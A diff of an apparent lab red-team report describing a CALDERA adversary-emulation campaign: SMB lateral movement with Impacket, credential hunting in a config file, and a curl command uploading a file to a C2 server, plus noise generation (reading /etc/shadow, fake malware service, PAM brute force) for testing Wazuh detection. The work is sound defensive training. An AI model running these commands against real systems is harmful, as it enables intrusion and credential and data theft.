@@ -2,7 +2,6 @@
 
 This document outlines the strategic planning, configuration, and execution of the adversary emulation campaign for Phase 1 (Baseline/Weak Security).
 
-
 ## Table of Contents
 1. [Role Overview & Objectives](#1-role-overview--objectives)
 2. [Target Scope](#2-target-scope)
@@ -10,8 +9,10 @@ This document outlines the strategic planning, configuration, and execution of t
 4. [CALDERA Configuration](#4-caldera-configuration)
 5. [Ingress Tool Transfer (Pre-Attack)](#5-ingress-tool-transfer-pre-attack)
 6. [Operation Execution Log](#6-operation-execution-log)
+   * [6.1. Detection Stress Test (Noise Generation)](#61-detection-stress-test-noise-generation-for-wazuh)
 7. [Findings & Observations](#7-findings--observations)
 
+---
 
 ## 1. Role Overview & Objectives
 
@@ -76,24 +77,14 @@ The operation relies on a custom Fact Source to define target parameters dynamic
     *   `domain.user.name`: `employee` (Initial compromised user context)
     *   `domain.user.password`: `employee`
 
-> **Screenshot Reference:** See `sis_meta_config.png` for the exact configuration.
-![Opis slike](./images/mojaslika.png)
-
+> **Screenshot Reference:** Configuration of the Fact Source used to target the Windows machine.
+>
+> ![SIS Meta Config](./images/sis_meta_config.png)
 
 ### 4.2. Custom Abilities Developed
 Standard CALDERA abilities were modified to fit the specific lab environment constraints (e.g., using `python3` scripts on Linux or `curl` on Windows).
 
-**A. Linux Discovery (Custom)**
-*   **Name:** `Simple File Discovery`
-*   **Command:** `find . -maxdepth 2 -not -path '*/.*'`
-*   **Purpose:** Enumerate files in the current user's directory without triggering permission denied errors on system folders.
-
-**B. Credential Access**
-*   **Name:** `Credential Hunting in Config Files`
-*   **Command:** `cat /tmp/db_config.py`
-*   **Purpose:** Simulate finding hardcoded administrative credentials left by developers.
-
-**C. Lateral Movement (Impacket)**
+**A. Lateral Movement (Impacket)**
 *   **Name:** `Lateral Movement - Admin Compromise`
 *   **Technique:** T1021.002 (SMB/Windows Admin Shares)
 *   **Platform:** Linux (Attacker)
@@ -103,7 +94,11 @@ Standard CALDERA abilities were modified to fit the specific lab environment con
     ```
 *   **Purpose:** Execute the agent on the target Windows machine using the discovered Admin credentials.
 
-**D. Data Exfiltration**
+> **Screenshot Reference:** Configuration of the Python3 PsExec command in Caldera.
+>
+> ![Lateral Movement Ability](./images/ability_lateral_config.png)
+
+**B. Data Exfiltration**
 *   **Name:** `Custom Exfiltration (Generate & Steal)`
 *   **Technique:** T1041
 *   **Platform:** Windows (Target)
@@ -112,12 +107,12 @@ Standard CALDERA abilities were modified to fit the specific lab environment con
     echo "HACKED BY RED TEAM" > C:\Users\Public\Exfil_Proof.txt && curl -F "data=@C:\Users\Public\Exfil_Proof.txt" http://10.10.0.53:8888/file/upload
     ```
 
-> **Screenshot Reference:** See `custom_abilities_config.png` for ability details.
-![Opis slike](./images/mojaslika.png)
-
+> **Screenshot Reference:** Configuration of the native Curl command for exfiltration.
+>
+> ![Exfiltration Ability](./images/ability_exfil_config.png)
 
 ### 4.3. Adversary Profile (`Project_Story_Mode`)
-All abilities were chained into a single profile to simulate a complete attack lifecycle.
+All abilities were chained into a single profile to simulate a complete attack lifecycle. The baseline profile consists of 11 discrete steps designed to validate the kill chain without excessive noise.
 
 **Execution Order:**
 1.  **Identify active user** (Verify foothold)
@@ -129,9 +124,9 @@ All abilities were chained into a single profile to simulate a complete attack l
 7.  **Windows Discovery** (System/Security/Account info)
 8.  **Exfiltration** (Steal Data)
 
-> **Screenshot Reference:** See `adversary_profile_setup.png` showing the full chain.
-![Opis slike](./images/mojaslika.png)
-
+> **Screenshot Reference:** The baseline adversary profile configuration (11 steps).
+>
+> ![Adversary Profile Baseline](./images/adversary_profile_baseline.png)
 
 ---
 
@@ -164,23 +159,47 @@ The operation was executed automatically using the `Project_Story_Mode` profile.
 | Time (GMT+1) | Ability Name | Tactic | Status | Analysis / Outcome |
 | :--- | :--- | :--- | :--- | :--- |
 | **15:31** | `Identify active user` | Discovery | 🟢 Success | Confirmed initial foothold on Linux (`vbubuntu`). |
-| **15:32** | `Simple File Discovery` | Discovery | 🟢 Success | Listed files in the current directory (Corrected from previous permission error). |
+| **15:32** | `Simple File Discovery` | Discovery | 🟢 Success | Listed files in the current directory. |
 | **15:33** | `Port Scan Target` | Discovery | 🟢 Success | Confirmed port 445 (SMB) and 135 (RPC) are open on 10.10.0.50. |
-| **15:33** | `Lateral Movement (Standard)` | Lateral | 🔴 Failed | Attack with `employee` credentials failed (`STATUS_LOGON_FAILURE`). Confirms standard users cannot execute remote code. |
+| **15:33** | `Lateral Movement (Standard)` | Lateral | 🔴 Failed | Attack with `employee` credentials failed. Expected behavior. |
 | **15:34** | `Credential Hunting` | Cred Access | 🟢 Success | Extracted `admin_lab` credentials from `/tmp/db_config.py`. |
-| **15:35** | `Lateral Movement (Admin)` | Lateral | 🟡 Timeout | **Success.** Although API timed out, the agent was successfully installed on Windows. Proof: New agent appeared. |
+| **15:35** | `Lateral Movement (Admin)` | Lateral | 🟡 Timeout | **Success.** Agent successfully installed on Windows despite API timeout. |
 | **15:37** | `Identify active user` | Discovery | 🟢 Success | **Lateral Movement Confirmed.** New agent running on Windows as `SYSTEM`. |
 | **15:38** | `System Information Discovery` | Discovery | 🟢 Success | Collected OS details (Windows 10 IoT Enterprise). |
 | **15:39** | `Security Software Discovery` | Discovery | 🟢 Success | Identified "Windows Defender" via WMI query. |
 | **15:39** | `Account Discovery (all)` | Discovery | 🔴 Failed | Command `net user /domain` failed to retrieve full list (likely due to DC connectivity nuance), but local enumeration worked. |
-| **15:40** | `Custom Exfiltration` | Exfiltration | 🟢 Success | File `Exfil_Proof.txt` uploaded to C2 server via `curl` (HTTP POST). |
+| **15:40** | `Custom Exfiltration` | Exfiltration | 🟢 Success | File `Exfil_Proof.txt` uploaded to C2 server via `curl`. |
 
 > **Evidence:**
-> *   See `operation_results_graph.png` for the visual attack chain.
-> *   See `agents_table_final.png` showing both Linux and Windows agents active.
-> *   See `exfilled_files.png` for the stolen data.
+>
+> **1. Operation Timeline:** Green indicators confirm successful execution of the kill chain steps (11 abilities).
+> ![Operation Results](./images/operation_results_timeline.png)
+>
+> **2. Active Agents:** Proof of successful Lateral Movement (Windows Agent `itlfxp` is active).
+> ![Active Agents](./images/active_agents_list.png)
 
-![Opis slike](./images/mojaslika.png)
+### 6.1. Detection Stress Test (Noise Generation for Wazuh)
+
+After validating the successful "Silent" kill chain (11 steps), the operation logic was extended to generate specific telemetry for the Blue Team (Wazuh SIEM). This phase involved adding deliberate "noisy" indicators to test detection rules.
+
+**Added Abilities (Extending Profile to 13 steps):**
+1.  **Dump Shadow File (Sudo):** Reads sensitive file `/etc/shadow` to trigger privilege escalation rules.
+2.  **Noisy Service Creation:** Registers `rt_malware.service` to test File Integrity Monitoring (FIM).
+3.  **Manual Brute Force:** Generates PAM authentication failures.
+
+**Execution approach:**
+These abilities were executed manually or appended to a secondary profile run to ensure the Analyst had sufficient data points for correlation.
+
+> **Screenshot Reference:**
+>
+> **1. Extended Adversary Profile:** The profile updated with noise-generating abilities (Total: 13 steps, showing "Dump Shadow" and "Noisy Service").
+> ![Extended Profile 13 Steps](./images/profile_extended_noise.png)
+>
+> **2. Noise Configuration:** Setup of the malicious service creation ability.
+> ![Wazuh Noise Config](./images/ability_wazuh_noise_config.png)
+>
+> **3. Manual Noise Execution:** Generating PAM authentication failures (`su` flooding) on Linux.
+> ![Manual Brute Force](./images/manual_pam_bruteforce.png)
 
 ---
 
